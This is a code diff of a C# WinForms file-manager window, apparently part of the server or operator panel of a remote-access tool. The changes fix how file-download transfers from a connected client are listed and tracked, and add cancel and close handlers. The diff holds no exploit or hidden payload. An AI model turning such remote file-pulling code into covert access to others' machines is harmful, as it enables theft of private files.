@@ -6,6 +6,7 @@ using System;
 using System.IO;
 using System.Linq;
 using System.Windows.Forms;
+using static Serveur.Controllers.FrmFileManagerController;
 
 namespace Serveur.Views
 {
@@ -14,7 +15,7 @@ namespace Serveur.Views
         private readonly ClientMosaic _client;
         private string _currentDir;
         private static readonly Random _rnd = new Random(Environment.TickCount);
-        private const int TRANSFER_STATUS = 2;
+        private const int TRANSFER_STATUS = 3;
         private const int TRANSFER_ID = 0;
 
         public FrmFileManager(ClientMosaic client)
@@ -150,11 +151,11 @@ namespace Serveur.Views
             }
         }
 
-        public void addItemToFileBrowser(string name, string size, FrmFileManagerController.PathType type, int imageIndex)
+        public void addItemToFileBrowser(string name, string size, PathType type, int imageIndex)
         {
             try
             {
-                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != FrmFileManagerController.PathType.Back) ? type.ToString() : string.Empty })
+                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != PathType.Back) ? type.ToString() : string.Empty })
                 {
                     Tag = type,
                     ImageIndex = imageIndex
@@ -174,15 +175,15 @@ namespace Serveur.Views
         {
             if(_client != null && _client.value != null && lvDirectory.SelectedItems.Count > 0)
             {
-                FrmFileManagerController.PathType type = (FrmFileManagerController.PathType)lvDirectory.SelectedItems[0].Tag;
+                PathType type = (PathType)lvDirectory.SelectedItems[0].Tag;
 
                 switch (type)
                 {
-                    case FrmFileManagerController.PathType.Back:
+                    case PathType.Back:
                         navigateUp();
                         refreshDirectory();
                         break;
-                    case FrmFileManagerController.PathType.Directory:
+                    case PathType.Directory:
                         setCurrentDir(getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
                         refreshDirectory();
                         break;
@@ -194,20 +195,40 @@ namespace Serveur.Views
         {
             foreach(ListViewItem files in lvDirectory.SelectedItems)
             {
-                FrmFileManagerController.PathType type = (FrmFileManagerController.PathType)files.Tag;
+                PathType type = (PathType)files.Tag;
 
-                if(type == FrmFileManagerController.PathType.File)
+                if(type == PathType.File)
                 {
                     string path = getAbsolutePath(files.SubItems[0].Text);
 
-                    int id = getNewTransferId(files.Index);
+                    int uniqId = getNewTransferId(files.Index);
 
                     if(_client  != null)
                     {
-                        new DoDownloadFile(path, id).Execute(_client);
-                        addTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
+                        int i = lvTransfers.Items.Count;
+
+                        new DoDownloadFile(path, uniqId, i).Execute(_client);
+
+                        addTransfer(uniqId, i, "Download", "Pending...", files.SubItems[0].Text);
                     }
                 }
+            }
+        }
+
+        public void addTransfer(int uniqId, int lvItem, string type, string status, string filename)
+        {
+            try
+            {
+                ListViewItem lvi =
+                  new ListViewItem(new string[] {uniqId.ToString(), lvItem.ToString(), type, status, filename });
+
+                lvDirectory.Invoke((MethodInvoker)delegate
+                {
+                    lvTransfers.Items.Add(lvi);
+                });
+            }
+            catch (InvalidOperationException)
+            {
             }
         }
 
@@ -216,18 +237,15 @@ namespace Serveur.Views
             return _rnd.Next(0, int.MaxValue) + o;
         }
 
-        public void updateTransferStatus(int index, string status, int imageIndex)
+        public void updateTransferStatus(int lvItem, int index, string status, int imageIndex)
         {
             try
             {
                 lvTransfers.Invoke((MethodInvoker)delegate
                 {
-                    //lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
-                    //if (imageIndex >= 0)
-                    //    lvTransfers.Items[index].ImageIndex = imageIndex;
                     lvTransfers.Invoke((MethodInvoker)delegate
                     {
-                        lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
+                        lvTransfers.Items[lvItem].SubItems[TRANSFER_STATUS].Text = status;
                     });
 
                 });
@@ -264,21 +282,15 @@ namespace Serveur.Views
             return index;
         }
 
-        public void addTransfer(int id, string type, string status, string filename)
+        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
         {
-            try
-            {
-                ListViewItem lvi =
-                    new ListViewItem(new string[] { id.ToString(), type, status, filename });
+            if (_client.value != null)
+                _client.value.frmFm = null;
+        }
 
-                lvDirectory.Invoke((MethodInvoker)delegate
-                {
-                    lvDirectory.Items.Add(lvi);
-                });
-            }
-            catch (InvalidOperationException)
-            {
-            }
+        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new DoDownloadFileCancel(125, 250).Execute(_client);
         }
     }
 }
